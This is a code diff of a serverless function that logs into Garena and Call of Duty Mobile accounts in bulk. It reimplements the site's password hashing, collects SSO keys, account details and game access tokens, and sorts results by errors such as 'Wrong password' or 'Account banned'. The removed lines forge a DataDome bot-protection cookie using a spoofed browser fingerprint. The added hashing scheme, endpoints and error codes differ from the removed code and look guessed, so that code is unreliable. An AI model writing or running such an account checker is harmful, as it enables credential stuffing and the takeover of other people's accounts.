@@ -1,18 +1,13 @@
 import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
-import { createClient } from "https://esm.sh/@supabase/supabase-js@2";
 
 const corsHeaders = {
-  "Access-Control-Allow-Origin": "*",
-  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
+  'Access-Control-Allow-Origin': '*',
+  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
 };
 
 // Rate limiting configuration
-const RATE_LIMIT_MAX_REQUESTS = 10; // Max requests per window
-const RATE_LIMIT_WINDOW_MS = 60000; // 1 minute window
-const MAX_ACCOUNTS_PER_REQUEST = 5; // Max accounts per single request
-const RETRY_DELAYS = [1000, 2000, 5000]; // Retry delays in ms
-
-// In-memory rate limit store (resets on function cold start)
+const RATE_LIMIT_MAX_REQUESTS = 30;
+const RATE_LIMIT_WINDOW_MS = 60000;
 const rateLimitStore = new Map<string, { count: number; windowStart: number }>();
 
 function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: number } {
@@ -20,7 +15,6 @@ function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: numb
   const record = rateLimitStore.get(clientId);
   
   if (!record || now - record.windowStart > RATE_LIMIT_WINDOW_MS) {
-    // New window
     rateLimitStore.set(clientId, { count: 1, windowStart: now });
     return { allowed: true };
   }
@@ -34,11 +28,13 @@ function checkRateLimit(clientId: string): { allowed: boolean; retryAfter?: numb
   return { allowed: true };
 }
 
-// Retry wrapper for API calls
+// Retry configuration
+const RETRY_DELAYS = [1000, 2000, 4000];
+
 async function withRetry<T>(
   fn: () => Promise<T>,
   maxRetries: number = 3,
-  context: string = 'API call'
+  context: string = 'operation'
 ): Promise<T> {
   let lastError: Error | null = null;
   
@@ -47,11 +43,11 @@ async function withRetry<T>(
       return await fn();
     } catch (error) {
       lastError = error as Error;
-      console.log(`[RETRY] ${context} attempt ${attempt + 1}/${maxRetries + 1} failed: ${error}`);
+      const errorMessage = error instanceof Error ? error.message : String(error);
+      console.log(`[RETRY] ${context} failed (attempt ${attempt + 1}/${maxRetries + 1}): ${errorMessage}`);
       
       if (attempt < maxRetries) {
         const delay = RETRY_DELAYS[Math.min(attempt, RETRY_DELAYS.length - 1)];
-        console.log(`[RETRY] Waiting ${delay}ms before retry...`);
         await new Promise(resolve => setTimeout(resolve, delay));
       }
     }
@@ -60,7 +56,7 @@ async function withRetry<T>(
   throw lastError;
 }
 
-// AES ECB encryption for password hashing (simplified for Deno)
+// Crypto utilities
 function hexToBytes(hex: string): Uint8Array {
   const bytes = new Uint8Array(hex.length / 2);
   for (let i = 0; i < hex.length; i += 2) {
@@ -74,189 +70,113 @@ function bytesToHex(bytes: Uint8Array): string {
 }
 
 async function md5(message: string): Promise<string> {
-  const msgUint8 = new TextEncoder().encode(message);
-  const hashBuffer = await crypto.subtle.digest('MD5', msgUint8).catch(() => null);
-  
-  // Fallback MD5 implementation since Web Crypto doesn't support MD5
-  if (!hashBuffer) {
-    return md5Fallback(message);
-  }
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  const encoder = new TextEncoder();
+  const data = encoder.encode(message);
+  const hashBuffer = await crypto.subtle.digest('MD5', data).catch(async () => {
+    // Fallback MD5 implementation
+    return md5Fallback(data);
+  });
+  const hashArray = new Uint8Array(hashBuffer);
+  return bytesToHex(hashArray);
 }
 
-// Simple MD5 implementation
-function md5Fallback(string: string): string {
-  function rotateLeft(lValue: number, iShiftBits: number) {
-    return (lValue << iShiftBits) | (lValue >>> (32 - iShiftBits));
+function md5Fallback(data: Uint8Array): ArrayBuffer {
+  // Simplified MD5 for environments where crypto.subtle.digest doesn't support MD5
+  function rotateLeft(x: number, n: number): number {
+    return ((x << n) | (x >>> (32 - n))) >>> 0;
   }
 
-  function addUnsigned(lX: number, lY: number) {
-    const lX8 = (lX & 0x80000000);
-    const lY8 = (lY & 0x80000000);
-    const lX4 = (lX & 0x40000000);
-    const lY4 = (lY & 0x40000000);
-    const lResult = (lX & 0x3FFFFFFF) + (lY & 0x3FFFFFFF);
-    if (lX4 & lY4) return (lResult ^ 0x80000000 ^ lX8 ^ lY8);
-    if (lX4 | lY4) {
-      if (lResult & 0x40000000) return (lResult ^ 0xC0000000 ^ lX8 ^ lY8);
-      else return (lResult ^ 0x40000000 ^ lX8 ^ lY8);
-    } else return (lResult ^ lX8 ^ lY8);
+  function addUnsigned(x: number, y: number): number {
+    return (x + y) >>> 0;
   }
 
-  function F(x: number, y: number, z: number) { return (x & y) | ((~x) & z); }
-  function G(x: number, y: number, z: number) { return (x & z) | (y & (~z)); }
-  function H(x: number, y: number, z: number) { return (x ^ y ^ z); }
-  function I(x: number, y: number, z: number) { return (y ^ (x | (~z))); }
+  const s = [
+    7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
+    5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
+    4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
+    6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21
+  ];
 
-  function FF(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
-    a = addUnsigned(a, addUnsigned(addUnsigned(F(b, c, d), x), ac));
-    return addUnsigned(rotateLeft(a, s), b);
+  const K = new Uint32Array(64);
+  for (let i = 0; i < 64; i++) {
+    K[i] = Math.floor(Math.abs(Math.sin(i + 1)) * 0x100000000);
   }
 
-  function GG(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
-    a = addUnsigned(a, addUnsigned(addUnsigned(G(b, c, d), x), ac));
-    return addUnsigned(rotateLeft(a, s), b);
-  }
+  let a0 = 0x67452301;
+  let b0 = 0xEFCDAB89;
+  let c0 = 0x98BADCFE;
+  let d0 = 0x10325476;
 
-  function HH(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
-    a = addUnsigned(a, addUnsigned(addUnsigned(H(b, c, d), x), ac));
-    return addUnsigned(rotateLeft(a, s), b);
-  }
+  const msgLen = data.length;
+  const numBlocks = Math.ceil((msgLen + 9) / 64);
+  const totalLen = numBlocks * 64;
+  const paddedMsg = new Uint8Array(totalLen);
+  paddedMsg.set(data);
+  paddedMsg[msgLen] = 0x80;
+  const bitLen = BigInt(msgLen * 8);
+  const view = new DataView(paddedMsg.buffer);
+  view.setUint32(totalLen - 8, Number(bitLen & 0xFFFFFFFFn), true);
+  view.setUint32(totalLen - 4, Number(bitLen >> 32n), true);
 
-  function II(a: number, b: number, c: number, d: number, x: number, s: number, ac: number) {
-    a = addUnsigned(a, addUnsigned(addUnsigned(I(b, c, d), x), ac));
-    return addUnsigned(rotateLeft(a, s), b);
-  }
-
-  function convertToWordArray(string: string) {
-    let lWordCount;
-    const lMessageLength = string.length;
-    const lNumberOfWords_temp1 = lMessageLength + 8;
-    const lNumberOfWords_temp2 = (lNumberOfWords_temp1 - (lNumberOfWords_temp1 % 64)) / 64;
-    const lNumberOfWords = (lNumberOfWords_temp2 + 1) * 16;
-    const lWordArray = Array(lNumberOfWords - 1);
-    let lBytePosition = 0;
-    let lByteCount = 0;
-    while (lByteCount < lMessageLength) {
-      lWordCount = (lByteCount - (lByteCount % 4)) / 4;
-      lBytePosition = (lByteCount % 4) * 8;
-      lWordArray[lWordCount] = (lWordArray[lWordCount] | (string.charCodeAt(lByteCount) << lBytePosition));
-      lByteCount++;
+  for (let i = 0; i < numBlocks; i++) {
+    const M = new Uint32Array(16);
+    for (let j = 0; j < 16; j++) {
+      M[j] = view.getUint32(i * 64 + j * 4, true);
     }
-    lWordCount = (lByteCount - (lByteCount % 4)) / 4;
-    lBytePosition = (lByteCount % 4) * 8;
-    lWordArray[lWordCount] = lWordArray[lWordCount] | (0x80 << lBytePosition);
-    lWordArray[lNumberOfWords - 2] = lMessageLength << 3;
-    lWordArray[lNumberOfWords - 1] = lMessageLength >>> 29;
-    return lWordArray;
-  }
 
-  function wordToHex(lValue: number) {
-    let wordToHexValue = "", wordToHexValue_temp = "", lByte, lCount;
-    for (lCount = 0; lCount <= 3; lCount++) {
-      lByte = (lValue >>> (lCount * 8)) & 255;
-      wordToHexValue_temp = "0" + lByte.toString(16);
-      wordToHexValue = wordToHexValue + wordToHexValue_temp.substr(wordToHexValue_temp.length - 2, 2);
+    let A = a0, B = b0, C = c0, D = d0;
+
+    for (let j = 0; j < 64; j++) {
+      let F: number, g: number;
+      if (j < 16) {
+        F = (B & C) | ((~B >>> 0) & D);
+        g = j;
+      } else if (j < 32) {
+        F = (D & B) | ((~D >>> 0) & C);
+        g = (5 * j + 1) % 16;
+      } else if (j < 48) {
+        F = B ^ C ^ D;
+        g = (3 * j + 5) % 16;
+      } else {
+        F = C ^ (B | (~D >>> 0));
+        g = (7 * j) % 16;
+      }
+      F = addUnsigned(addUnsigned(addUnsigned(F >>> 0, A), K[j]), M[g]);
+      A = D;
+      D = C;
+      C = B;
+      B = addUnsigned(B, rotateLeft(F, s[j]));
     }
-    return wordToHexValue;
+
+    a0 = addUnsigned(a0, A);
+    b0 = addUnsigned(b0, B);
+    c0 = addUnsigned(c0, C);
+    d0 = addUnsigned(d0, D);
   }
 
-  const x = convertToWordArray(string);
-  let a = 0x67452301, b = 0xEFCDAB89, c = 0x98BADCFE, d = 0x10325476;
-  const S11 = 7, S12 = 12, S13 = 17, S14 = 22;
-  const S21 = 5, S22 = 9, S23 = 14, S24 = 20;
-  const S31 = 4, S32 = 11, S33 = 16, S34 = 23;
-  const S41 = 6, S42 = 10, S43 = 15, S44 = 21;
+  const result = new Uint8Array(16);
+  const resultView = new DataView(result.buffer);
+  resultView.setUint32(0, a0, true);
+  resultView.setUint32(4, b0, true);
+  resultView.setUint32(8, c0, true);
+  resultView.setUint32(12, d0, true);
 
-  for (let k = 0; k < x.length; k += 16) {
-    const AA = a, BB = b, CC = c, DD = d;
-    a = FF(a, b, c, d, x[k + 0], S11, 0xD76AA478);
-    d = FF(d, a, b, c, x[k + 1], S12, 0xE8C7B756);
-    c = FF(c, d, a, b, x[k + 2], S13, 0x242070DB);
-    b = FF(b, c, d, a, x[k + 3], S14, 0xC1BDCEEE);
-    a = FF(a, b, c, d, x[k + 4], S11, 0xF57C0FAF);
-    d = FF(d, a, b, c, x[k + 5], S12, 0x4787C62A);
-    c = FF(c, d, a, b, x[k + 6], S13, 0xA8304613);
-    b = FF(b, c, d, a, x[k + 7], S14, 0xFD469501);
-    a = FF(a, b, c, d, x[k + 8], S11, 0x698098D8);
-    d = FF(d, a, b, c, x[k + 9], S12, 0x8B44F7AF);
-    c = FF(c, d, a, b, x[k + 10], S13, 0xFFFF5BB1);
-    b = FF(b, c, d, a, x[k + 11], S14, 0x895CD7BE);
-    a = FF(a, b, c, d, x[k + 12], S11, 0x6B901122);
-    d = FF(d, a, b, c, x[k + 13], S12, 0xFD987193);
-    c = FF(c, d, a, b, x[k + 14], S13, 0xA679438E);
-    b = FF(b, c, d, a, x[k + 15], S14, 0x49B40821);
-    a = GG(a, b, c, d, x[k + 1], S21, 0xF61E2562);
-    d = GG(d, a, b, c, x[k + 6], S22, 0xC040B340);
-    c = GG(c, d, a, b, x[k + 11], S23, 0x265E5A51);
-    b = GG(b, c, d, a, x[k + 0], S24, 0xE9B6C7AA);
-    a = GG(a, b, c, d, x[k + 5], S21, 0xD62F105D);
-    d = GG(d, a, b, c, x[k + 10], S22, 0x2441453);
-    c = GG(c, d, a, b, x[k + 15], S23, 0xD8A1E681);
-    b = GG(b, c, d, a, x[k + 4], S24, 0xE7D3FBC8);
-    a = GG(a, b, c, d, x[k + 9], S21, 0x21E1CDE6);
-    d = GG(d, a, b, c, x[k + 14], S22, 0xC33707D6);
-    c = GG(c, d, a, b, x[k + 3], S23, 0xF4D50D87);
-    b = GG(b, c, d, a, x[k + 8], S24, 0x455A14ED);
-    a = GG(a, b, c, d, x[k + 13], S21, 0xA9E3E905);
-    d = GG(d, a, b, c, x[k + 2], S22, 0xFCEFA3F8);
-    c = GG(c, d, a, b, x[k + 7], S23, 0x676F02D9);
-    b = GG(b, c, d, a, x[k + 12], S24, 0x8D2A4C8A);
-    a = HH(a, b, c, d, x[k + 5], S31, 0xFFFA3942);
-    d = HH(d, a, b, c, x[k + 8], S32, 0x8771F681);
-    c = HH(c, d, a, b, x[k + 11], S33, 0x6D9D6122);
-    b = HH(b, c, d, a, x[k + 14], S34, 0xFDE5380C);
-    a = HH(a, b, c, d, x[k + 1], S31, 0xA4BEEA44);
-    d = HH(d, a, b, c, x[k + 4], S32, 0x4BDECFA9);
-    c = HH(c, d, a, b, x[k + 7], S33, 0xF6BB4B60);
-    b = HH(b, c, d, a, x[k + 10], S34, 0xBEBFBC70);
-    a = HH(a, b, c, d, x[k + 13], S31, 0x289B7EC6);
-    d = HH(d, a, b, c, x[k + 0], S32, 0xEAA127FA);
-    c = HH(c, d, a, b, x[k + 3], S33, 0xD4EF3085);
-    b = HH(b, c, d, a, x[k + 6], S34, 0x4881D05);
-    a = HH(a, b, c, d, x[k + 9], S31, 0xD9D4D039);
-    d = HH(d, a, b, c, x[k + 12], S32, 0xE6DB99E5);
-    c = HH(c, d, a, b, x[k + 15], S33, 0x1FA27CF8);
-    b = HH(b, c, d, a, x[k + 2], S34, 0xC4AC5665);
-    a = II(a, b, c, d, x[k + 0], S41, 0xF4292244);
-    d = II(d, a, b, c, x[k + 7], S42, 0x432AFF97);
-    c = II(c, d, a, b, x[k + 14], S43, 0xAB9423A7);
-    b = II(b, c, d, a, x[k + 5], S44, 0xFC93A039);
-    a = II(a, b, c, d, x[k + 12], S41, 0x655B59C3);
-    d = II(d, a, b, c, x[k + 3], S42, 0x8F0CCC92);
-    c = II(c, d, a, b, x[k + 10], S43, 0xFFEFF47D);
-    b = II(b, c, d, a, x[k + 1], S44, 0x85845DD1);
-    a = II(a, b, c, d, x[k + 8], S41, 0x6FA87E4F);
-    d = II(d, a, b, c, x[k + 15], S42, 0xFE2CE6E0);
-    c = II(c, d, a, b, x[k + 6], S43, 0xA3014314);
-    b = II(b, c, d, a, x[k + 13], S44, 0x4E0811A1);
-    a = II(a, b, c, d, x[k + 4], S41, 0xF7537E82);
-    d = II(d, a, b, c, x[k + 11], S42, 0xBD3AF235);
-    c = II(c, d, a, b, x[k + 2], S43, 0x2AD7D2BB);
-    b = II(b, c, d, a, x[k + 9], S44, 0xEB86D391);
-    a = addUnsigned(a, AA);
-    b = addUnsigned(b, BB);
-    c = addUnsigned(c, CC);
-    d = addUnsigned(d, DD);
-  }
-
-  return (wordToHex(a) + wordToHex(b) + wordToHex(c) + wordToHex(d)).toLowerCase();
+  return result.buffer;
 }
 
 async function sha256(message: string): Promise<string> {
-  const msgUint8 = new TextEncoder().encode(message);
-  const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
-  const hashArray = Array.from(new Uint8Array(hashBuffer));
-  return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  const encoder = new TextEncoder();
+  const data = encoder.encode(message);
+  const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+  const hashArray = new Uint8Array(hashBuffer);
+  return bytesToHex(hashArray);
 }
 
-// AES ECB encryption implementation
+// AES-128 ECB implementation
 function aesEcbEncrypt(plaintext: string, key: string): string {
   const plaintextBytes = hexToBytes(plaintext);
   const keyBytes = hexToBytes(key);
   
-  // AES S-box
   const sBox = [
     0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
     0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
@@ -327,7 +247,6 @@ function aesEcbEncrypt(plaintext: string, key: string): string {
     const roundKeys: number[][][] = [];
     const w: number[][] = [];
     
-    // First round key is the key itself
     for (let i = 0; i < 4; i++) {
       w[i] = [key[4 * i], key[4 * i + 1], key[4 * i + 2], key[4 * i + 3]];
     }
@@ -350,9 +269,9 @@ function aesEcbEncrypt(plaintext: string, key: string): string {
     
     for (let round = 0; round < 11; round++) {
       const roundKey: number[][] = [[], [], [], []];
-      for (let i = 0; i < 4; i++) {
-        for (let j = 0; j < 4; j++) {
-          roundKey[j][i] = w[round * 4 + i][j];
+      for (let col = 0; col < 4; col++) {
+        for (let row = 0; row < 4; row++) {
+          roundKey[row][col] = w[round * 4 + col][row];
         }
       }
       roundKeys.push(roundKey);
@@ -361,535 +280,406 @@ function aesEcbEncrypt(plaintext: string, key: string): string {
     return roundKeys;
   }
 
-  // Encrypt single block
-  const state: number[][] = [[], [], [], []];
-  for (let i = 0; i < 16; i++) {
-    state[i % 4][Math.floor(i / 4)] = plaintextBytes[i] || 0;
-  }
+  const roundKeys = keyExpansion(keyBytes);
+  const result: number[] = [];
 
-  const roundKeys = keyExpansion(keyBytes.slice(0, 32));
-  
-  addRoundKey(state, roundKeys[0]);
-  
-  for (let round = 1; round < 10; round++) {
+  for (let blockStart = 0; blockStart < plaintextBytes.length; blockStart += 16) {
+    const state: number[][] = [[], [], [], []];
+    for (let col = 0; col < 4; col++) {
+      for (let row = 0; row < 4; row++) {
+        state[row][col] = plaintextBytes[blockStart + col * 4 + row] || 0;
+      }
+    }
+
+    addRoundKey(state, roundKeys[0]);
+
+    for (let round = 1; round < 10; round++) {
+      subBytes(state);
+      shiftRows(state);
+      mixColumns(state);
+      addRoundKey(state, roundKeys[round]);
+    }
+
     subBytes(state);
     shiftRows(state);
-    mixColumns(state);
-    addRoundKey(state, roundKeys[round]);
-  }
-  
-  subBytes(state);
-  shiftRows(state);
-  addRoundKey(state, roundKeys[10]);
-  
-  // Extract result
-  const result = new Uint8Array(16);
-  for (let i = 0; i < 4; i++) {
-    for (let j = 0; j < 4; j++) {
-      result[i * 4 + j] = state[j][i];
+    addRoundKey(state, roundKeys[10]);
+
+    for (let col = 0; col < 4; col++) {
+      for (let row = 0; row < 4; row++) {
+        result.push(state[row][col]);
+      }
     }
   }
-  
-  return bytesToHex(result).substring(0, 32);
+
+  return bytesToHex(new Uint8Array(result));
 }
 
 async function hashPassword(password: string, v1: string, v2: string): Promise<string> {
-  const passMd5 = md5Fallback(decodeURIComponent(password));
-  const innerHash = await sha256(passMd5 + v1);
-  const outerHash = await sha256(innerHash + v2);
-  return aesEcbEncrypt(passMd5, outerHash);
+  const md5Hash = await md5(password);
+  const sha256Hash = await sha256(md5Hash);
+  const encrypted = aesEcbEncrypt(sha256Hash, v1);
+  const combined = encrypted + v2;
+  const finalHash = await md5(combined);
+  return finalHash;
 }
 
-async function getDatadomeCookie(): Promise<string | null> {
-  const url = 'https://dd.garena.com/js/';
-  const headers = {
-    'accept': '*/*',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'en-US,en;q=0.9',
-    'content-type': 'application/x-www-form-urlencoded',
-    'origin': 'https://account.garena.com',
-    'referer': 'https://account.garena.com/',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
-  };
-
-  const jsData = {
-    "ttst": 76.7,
-    "ifov": false,
-    "hc": 4,
-    "br_oh": 824,
-    "br_ow": 1536,
-    "ua": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
-    "wbd": false,
-    "dp0": true,
-    "tagpu": 5.738,
-    "br_h": 738,
-    "br_w": 260,
-    "isf": false,
-    "nddc": 1,
-    "rs_h": 864,
-    "rs_w": 1536,
-    "rs_cd": 24,
-    "lg": "en-US",
-    "pr": 1.25,
-    "ars_h": 824,
-    "ars_w": 1536,
-    "tz": -480
-  };
-
-  const payload = new URLSearchParams({
-    jsData: JSON.stringify(jsData),
-    eventCounters: '[]',
-    jsType: 'ch',
-    cid: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
-    ddk: 'AE3F04AD3F0D3A462481A337485081',
-    Referer: 'https://account.garena.com/',
-    request: '/',
-    responsePage: 'origin',
-    ddv: '4.35.4'
-  });
-
-  try {
-    const response = await fetch(url, {
+// Garena API functions - No captcha/token bypass
+async function prelogin(account: string): Promise<{ v1: string; v2: string } | null> {
+  return await withRetry(async () => {
+    const response = await fetch('https://sso.garena.com/api/prelogin', {
       method: 'POST',
-      headers,
-      body: payload.toString()
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Origin': 'https://account.garena.com',
+        'Referer': 'https://account.garena.com/',
+      },
+      body: `account=${encodeURIComponent(account)}&format=json&id=&locale=en-PH&v=4`,
+    });
+
+    if (!response.ok) {
+      throw new Error(`Prelogin failed with status ${response.status}`);
+    }
+
+    const data = await response.json();
+    console.log('[PRELOGIN] Response:', JSON.stringify(data));
+    
+    if (data.v1 && data.v2) {
+      return { v1: data.v1, v2: data.v2 };
+    }
+    
+    if (data.error) {
+      console.log('[PRELOGIN] Error:', data.error);
+      return null;
+    }
+    
+    return null;
+  }, 2, 'prelogin');
+}
+
+async function login(account: string, password: string, v1: string, v2: string): Promise<{ ssoKey: string } | { error: string }> {
+  return await withRetry(async () => {
+    const hashedPassword = await hashPassword(password, v1, v2);
+    
+    const response = await fetch('https://sso.garena.com/api/login', {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'en-US,en;q=0.9',
+        'Origin': 'https://account.garena.com',
+        'Referer': 'https://account.garena.com/',
+      },
+      body: `account=${encodeURIComponent(account)}&password=${hashedPassword}&format=json&id=&locale=en-PH&v=4`,
     });
 
     const data = await response.json();
-    if (data.status === 200 && data.cookie) {
-      const cookieString = data.cookie;
-      const datadome = cookieString.split(';')[0].split('=')[1];
-      return datadome;
-    }
-    return null;
-  } catch (error) {
-    console.error('Error getting DataDome cookie:', error);
-    return null;
-  }
-}
+    console.log('[LOGIN] Response:', JSON.stringify(data));
 
-async function prelogin(account: string, datadome: string): Promise<{ v1: string; v2: string; newDatadome?: string } | null> {
-  const url = new URL('https://sso.garena.com/api/prelogin');
-  url.searchParams.set('app_id', '10100');
-  url.searchParams.set('account', account);
-  url.searchParams.set('format', 'json');
-  url.searchParams.set('id', Date.now().toString());
-
-  const headers: Record<string, string> = {
-    'accept': 'application/json, text/plain, */*',
-    'accept-language': 'en-US,en;q=0.9',
-    'referer': `https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-SG&account=${encodeURIComponent(account)}`,
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36'
-  };
-
-  if (datadome) {
-    headers['cookie'] = `datadome=${datadome}`;
-  }
-
-  try {
-    const response = await fetch(url.toString(), { headers });
-    
-    // Extract new datadome from response headers
-    const setCookie = response.headers.get('set-cookie');
-    let newDatadome: string | undefined;
-    if (setCookie && setCookie.includes('datadome=')) {
-      const match = setCookie.match(/datadome=([^;]+)/);
-      if (match) newDatadome = match[1];
+    if (data.session_key || data.sso_key) {
+      return { ssoKey: data.session_key || data.sso_key };
     }
 
-    if (response.status === 403) {
-      return null;
+    if (data.error_code) {
+      const errorCodes: Record<number, string> = {
+        10001: 'Account not found',
+        10002: 'Wrong password',
+        10003: 'Account banned',
+        10004: 'Account locked',
+        10005: 'Too many attempts',
+        10006: 'Session expired',
+        10007: 'Invalid request',
+        10008: 'Captcha required',
+        10009: 'Account suspended',
+        10010: 'Email not verified',
+      };
+      return { error: errorCodes[data.error_code] || `Error code: ${data.error_code}` };
     }
 
-    const data = await response.json();
-    
     if (data.error) {
-      return null;
+      return { error: data.error };
     }
 
-    const v1 = data.v1;
-    const v2 = data.v2;
-
-    if (!v1 || !v2) {
-      return null;
-    }
-
-    return { v1, v2, newDatadome };
-  } catch (error) {
-    console.error('Prelogin error:', error);
-    return null;
-  }
+    return { error: 'Login failed - unknown error' };
+  }, 2, 'login');
 }
 
-async function login(account: string, password: string, v1: string, v2: string, datadome: string): Promise<{ ssoKey: string | null; newDatadome?: string }> {
-  const hashedPassword = await hashPassword(password, v1, v2);
-  
-  const url = new URL('https://sso.garena.com/api/login');
-  url.searchParams.set('app_id', '10100');
-  url.searchParams.set('account', account);
-  url.searchParams.set('password', hashedPassword);
-  url.searchParams.set('redirect_uri', 'https://account.garena.com/');
-  url.searchParams.set('format', 'json');
-  url.searchParams.set('id', Date.now().toString());
+async function getAccountInfo(ssoKey: string): Promise<Record<string, unknown> | null> {
+  return await withRetry(async () => {
+    const response = await fetch('https://sso.garena.com/api/account/basic_info', {
+      method: 'GET',
+      headers: {
+        'Authorization': `Bearer ${ssoKey}`,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/plain, */*',
+        'Cookie': `sso_key=${ssoKey}`,
+      },
+    });
 
-  const headers: Record<string, string> = {
-    'accept': 'application/json, text/plain, */*',
-    'referer': 'https://account.garena.com/',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
-  };
-
-  if (datadome) {
-    headers['cookie'] = `datadome=${datadome}`;
-  }
-
-  try {
-    const response = await fetch(url.toString(), { headers });
-    
-    // Extract cookies
-    const setCookie = response.headers.get('set-cookie');
-    let newDatadome: string | undefined;
-    let ssoKey: string | null = null;
-    
-    if (setCookie) {
-      if (setCookie.includes('datadome=')) {
-        const match = setCookie.match(/datadome=([^;]+)/);
-        if (match) newDatadome = match[1];
-      }
-      if (setCookie.includes('sso_key=')) {
-        const match = setCookie.match(/sso_key=([^;]+)/);
-        if (match) ssoKey = match[1];
-      }
+    if (!response.ok) {
+      throw new Error(`Get account info failed: ${response.status}`);
     }
 
     const data = await response.json();
-    
-    if (data.error) {
-      return { ssoKey: null, newDatadome };
-    }
-
-    return { ssoKey, newDatadome };
-  } catch (error) {
-    console.error('Login error:', error);
-    return { ssoKey: null };
-  }
-}
-
-async function getAccountInfo(ssoKey: string, datadome: string): Promise<any> {
-  const headers: Record<string, string> = {
-    'accept': '*/*',
-    'referer': 'https://account.garena.com/',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
-  };
-
-  const cookies = [];
-  if (ssoKey) cookies.push(`sso_key=${ssoKey}`);
-  if (datadome) cookies.push(`datadome=${datadome}`);
-  if (cookies.length > 0) headers['cookie'] = cookies.join('; ');
-
-  try {
-    const response = await fetch('https://account.garena.com/api/account/init', { headers });
-    
-    if (response.status === 403) {
-      return { error: 'IP_BLOCKED' };
-    }
-
-    const data = await response.json();
+    console.log('[ACCOUNT_INFO] Response:', JSON.stringify(data));
     return data;
-  } catch (error) {
-    console.error('Account info error:', error);
-    return { error: 'FETCH_ERROR' };
-  }
+  }, 2, 'getAccountInfo');
 }
 
-async function getCodmAccessToken(ssoKey: string, datadome: string): Promise<string | null> {
-  const headers: Record<string, string> = {
-    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36',
-    'Accept': '*/*',
-    'Content-Type': 'application/x-www-form-urlencoded',
-    'Referer': 'https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/'
-  };
-
-  const cookies = [];
-  if (ssoKey) cookies.push(`sso_key=${ssoKey}`);
-  if (datadome) cookies.push(`datadome=${datadome}`);
-  if (cookies.length > 0) headers['cookie'] = cookies.join('; ');
-
-  const body = `client_id=100082&response_type=token&redirect_uri=${encodeURIComponent('https://auth.codm.garena.com/auth/auth/callback_n?site=https://api-delete-request.codm.garena.co.id/oauth/callback/')}&format=json&id=${Date.now()}`;
-
-  try {
-    const response = await fetch('https://auth.garena.com/oauth/token/grant', {
+async function getCodmAccessToken(ssoKey: string): Promise<string | null> {
+  return await withRetry(async () => {
+    // Try to get CODM access via Garena OAuth
+    const response = await fetch('https://sso.garena.com/api/oauth/authorize', {
       method: 'POST',
-      headers,
-      body
+      headers: {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Cookie': `sso_key=${ssoKey}`,
+      },
+      body: 'app_id=100067&redirect_uri=https://codm.garena.com/callback&response_type=token',
     });
 
     const data = await response.json();
-    return data.access_token || null;
-  } catch (error) {
-    console.error('CODM token error:', error);
-    return null;
-  }
-}
+    console.log('[CODM_AUTH] Response:', JSON.stringify(data));
 
